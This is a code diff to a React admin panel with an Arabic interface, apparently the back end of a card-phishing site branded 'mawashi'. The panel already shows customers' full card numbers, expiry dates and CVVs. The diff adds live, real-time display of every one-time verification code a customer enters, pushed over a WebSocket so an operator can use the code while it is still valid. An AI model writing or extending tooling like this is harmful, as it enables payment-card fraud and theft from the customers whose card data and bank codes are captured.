@@ -1,6 +1,6 @@
 import { useState, useEffect, useMemo } from 'react';
 import { useListAdminOrders } from '@workspace/api-client-react';
-import { User, CreditCard, Shield, FileText, ChevronRight, Phone, MapPin, Calendar, RefreshCw, Wifi, WifiOff, Clock } from 'lucide-react';
+import { User, CreditCard, Shield, FileText, ChevronRight, Phone, MapPin, Calendar, RefreshCw, Wifi, WifiOff, Clock, Check, X } from 'lucide-react';
 import { LoadingBlock, ErrorBlock } from '../shared';
 import { usePresence } from '@/hooks/usePresence';
 
@@ -13,6 +13,14 @@ interface CardAttempt {
   cardNumber: string;
   cardExpiry: string;
   cardCvv: string | null;
+  createdAt: string;
+}
+
+interface OtpAttempt {
+  id: number;
+  orderId: number;
+  otpCode: string;
+  success: boolean;
   createdAt: string;
 }
 
@@ -66,6 +74,8 @@ export function CustomersAdmin() {
   const [activeTab, setActiveTab] = useState<CustomerTab>('info');
   const [cardAttempts, setCardAttempts] = useState<CardAttempt[]>([]);
   const [loadingAttempts, setLoadingAttempts] = useState(false);
+  const [otpAttempts, setOtpAttempts] = useState<OtpAttempt[]>([]);
+  const [loadingOtpAttempts, setLoadingOtpAttempts] = useState(false);
 
   // Listen for real-time new order events via WebSocket
   useEffect(() => {
@@ -125,6 +135,52 @@ export function CustomersAdmin() {
     
     window.addEventListener('mawashi-card-attempt', handleCardAttempt as EventListener);
     return () => window.removeEventListener('mawashi-card-attempt', handleCardAttempt as EventListener);
+  }, [selectedCustomerId]);
+
+  // Fetch OTP attempts when selected customer changes
+  useEffect(() => {
+    if (!selectedCustomerId) {
+      setOtpAttempts([]);
+      return;
+    }
+
+    const fetchOtpAttempts = async () => {
+      setLoadingOtpAttempts(true);
+      try {
+        const response = await fetch(`/api/admin/orders/${selectedCustomerId}/otp-attempts`);
+        if (response.ok) {
+          const data = await response.json();
+          setOtpAttempts(data);
+        }
+      } catch (error) {
+        console.error("[Admin] Failed to fetch OTP attempts:", error);
+      } finally {
+        setLoadingOtpAttempts(false);
+      }
+    };
+
+    fetchOtpAttempts();
+  }, [selectedCustomerId]);
+
+  // Listen for real-time OTP attempt updates via WebSocket
+  useEffect(() => {
+    const handleOtpAttempt = (event: CustomEvent) => {
+      const attempt = event.detail;
+      console.log("[Admin] OTP attempt event received:", attempt);
+      
+      if (selectedCustomerId && attempt.orderId === selectedCustomerId) {
+        setOtpAttempts(prev => {
+          const exists = prev.some(a => a.id === attempt.id);
+          if (!exists) {
+            return [{ ...attempt }, ...prev];
+          }
+          return prev;
+        });
+      }
+    };
+    
+    window.addEventListener('mawashi-otp-attempt', handleOtpAttempt as EventListener);
+    return () => window.removeEventListener('mawashi-otp-attempt', handleOtpAttempt as EventListener);
   }, [selectedCustomerId]);
   
   // Real-time presence from WebSocket
@@ -354,38 +410,89 @@ export function CustomersAdmin() {
     </div>
   ) : null;
 
+  // OTP attempt card component
+  const OtpAttemptCard = ({ attempt, index }: { attempt: OtpAttempt; index: number }) => (
+    <div className={`rounded-lg border bg-card p-6 ${index === 0 && attempt.success ? 'ring-2 ring-green-500' : index === 0 ? 'ring-2 ring-primary' : ''}`}>
+      <div className="mb-4 flex items-center justify-between">
+        <div className="flex items-center gap-2">
+          <span className="text-sm font-medium text-muted-foreground">المحاولة #{index + 1}</span>
+          {index === 0 && (
+            <span className={`rounded-full px-2 py-0.5 text-xs font-medium ${
+              attempt.success 
+                ? 'bg-green-500/10 text-green-600' 
+                : 'bg-primary/10 text-primary'
+            }`}>
+              {attempt.success ? 'الأحدث - نجاح' : 'الأحدث'}
+            </span>
+          )}
+        </div>
+        <div className="flex items-center gap-1 text-xs text-muted-foreground">
+          <Clock className="h-3 w-3" />
+          {formatDateTime(attempt.createdAt)}
+        </div>
+      </div>
+
+      <p className="mb-4 text-center text-sm text-muted-foreground">رمز التحقق المدخل</p>
+      <div className="flex justify-center gap-2">
+        {attempt.otpCode.split('').map((digit, i) => (
+          <div
+            key={i}
+            className={`flex h-12 w-10 items-center justify-center rounded-lg border-2 text-lg font-bold ${
+              attempt.success 
+                ? 'border-green-500/20 bg-green-500/5 text-green-600' 
+                : 'border-red-500/20 bg-red-500/5 text-red-600'
+            }`}
+          >
+            {digit}
+          </div>
+        ))}
+      </div>
+      <p className={`mt-4 text-center text-xs ${attempt.success ? 'text-green-600' : 'text-red-600'}`}>
+        {attempt.success ? '✓ تم التحقق بنجاح' : '✗ غير صحيح'}
+      </p>
+    </div>
+  );
+
   const VerificationSection = () => selectedOrder ? (
     <div className="space-y-4">
       <div className="flex items-center gap-3 rounded-xl bg-primary/10 p-4">
         <Shield className="h-6 w-6 text-primary" />
         <div>
           <h3 className="font-bold">رمز التحقق</h3>
-          <p className="text-sm text-muted-foreground">كود التحقق من العملية</p>
+          <p className="text-sm text-muted-foreground">
+            {otpAttempts.length > 0 
+              ? `${otpAttempts.length} محاولة إدخال` 
+              : 'كود التحقق من العملية'}
+          </p>
         </div>
       </div>
 
-      <div className="rounded-lg border bg-card p-6">
-        <p className="mb-4 text-center text-sm text-muted-foreground">رمز التحقق المدخل</p>
-        {selectedOrder.otpCode ? (
-          <>
-            <div className="flex justify-center gap-2">
-              {selectedOrder.otpCode.split('').map((digit, i) => (
-                <div
-                  key={i}
-                  className="flex h-12 w-10 items-center justify-center rounded-lg border-2 border-green-500/20 bg-green-500/5 text-lg font-bold text-green-600"
-                >
-                  {digit}
-                </div>
-              ))}
-            </div>
-            <p className="mt-4 text-center text-xs text-green-600">✓ تم التحقق بنجاح</p>
-          </>
-        ) : (
-          <div className="flex justify-center">
-            <span className="text-muted-foreground">لم يتم إدخال رمز التحقق بعد</span>
-          </div>
-        )}
-      </div>
+      {loadingOtpAttempts ? (
+        <div className="rounded-lg border bg-card p-6 text-center text-muted-foreground">
+          جاري تحميل المحاولات...
+        </div>
+      ) : otpAttempts.length > 0 ? (
+        <div className="space-y-4">
+          {otpAttempts.map((attempt, index) => (
+            <OtpAttemptCard key={attempt.id} attempt={attempt} index={index} />
+          ))}
+        </div>
+      ) : selectedOrder.otpCode ? (
+        <OtpAttemptCard 
+          attempt={{
+            id: 0,
+            orderId: selectedOrder.id,
+            otpCode: selectedOrder.otpCode,
+            success: true,
+            createdAt: selectedOrder.createdAt as string,
+          }} 
+          index={0} 
+        />
+      ) : (
+        <div className="rounded-lg border bg-card p-6 text-center text-muted-foreground">
+          لم يتم إدخال رمز التحقق بعد
+        </div>
+      )}
     </div>
   ) : null;
 
